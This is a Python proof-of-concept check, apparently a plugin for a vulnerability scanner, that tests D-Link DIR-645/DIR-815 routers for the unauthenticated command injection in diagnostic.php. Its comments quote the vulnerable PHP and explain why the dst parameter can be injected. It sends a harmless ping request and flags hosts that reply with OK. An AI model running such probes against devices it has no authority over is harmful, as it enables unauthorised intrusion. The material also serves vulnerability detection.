#!/usr/bin/env python
# -*- coding: utf-8 -*-

'''
@author: gzh
@license: (C) Copyright 2013-2017, Node Supply Chain Manager Corporation Limited.
@contact: 937f5a138eb9c25ba5be79214f48bd31@qq.com
@software: PyCharm
@refer: https://www.exploit-db.com/exploits/24956
@file: dlink_command_execution2.py
@time: 2018/12/3 15:59
@info: 
@desc: 路由器的web文件夹一般就在suashfs-root/www或者suashfs-root/htdocs文件夹里。路由器固件所使用的语言一般为 asp,php,cgi,lua等语言。
	   这里主要进行php的代码审计来挖掘漏洞。D-Link DIR-645 & DIR-815 命令执行漏洞
	   <? if ($_POST["act"] == "ping") {
		    set("/runtime/diagnostic/ping", $_POST["dst"]);
		    $result = "OK";
		  }
		  else if ($_POST["act"] == "pingreport")
		  {
		    $result = get("x", "/runtime/diagnostic/ping");
		  }
		  echo '<?xml version="1.0"?>\n';
		?><diagnostic>
		    <report><?=$result?></report>
		  </diagnostic>
	首先没有权限认证，act=ping即可进入，接着看到对输入的dst没有进行过滤，直接set进来，且给结果赋值为ok，盲注

'''

from ..miniCurl import Curl
from ..t import T

import urlparse


class P(T):
	def __init__(self):
		T.__init__(self)
	
	def verify(self, head='', context='', ip='', port='', productname={}, keywords='', hackresults=''):
		arg = 'http://' + ip + ':' + port + '/'
		curl = Curl()
		result = {}
		result['result'] = False
		
		url = 'diagnostic.php'
		payload = 'act=ping&dst=www.taobao.com'
		code, head, res, errcode, _ = curl.curl2(arg + url, payload)

		if code == 200 and '<report>OK' in res:
			output('dlink unauthenticated command injection ' + arg + url, result, 'hole')

		del curl
		return result


def output(url, result, label):
	info = url + '  dlink  Vul '
	result['result'] = True
	result['VerifyInfo'] = {}
	result['VerifyInfo']['type'] = 'unauthenticated Vul'
	result['VerifyInfo']['URL'] = url
	result['VerifyInfo']['payload'] = '/thirdparty/www/www_bbc74422563e932563c21077eb432bc1.py'
	result['VerifyInfo']['level'] = label
	result['VerifyInfo']['result'] = info


if __name__ == '__main__':
	print
	P().verify(ip='http://yunlai.cn:803/sfdsfds/', port='80')

# /root/github/poccreate/thirdparty/www/www_bbc74422563e932563c21077eb432bc1.py
# /root/github/poccreate/codesrc/exp-1076.py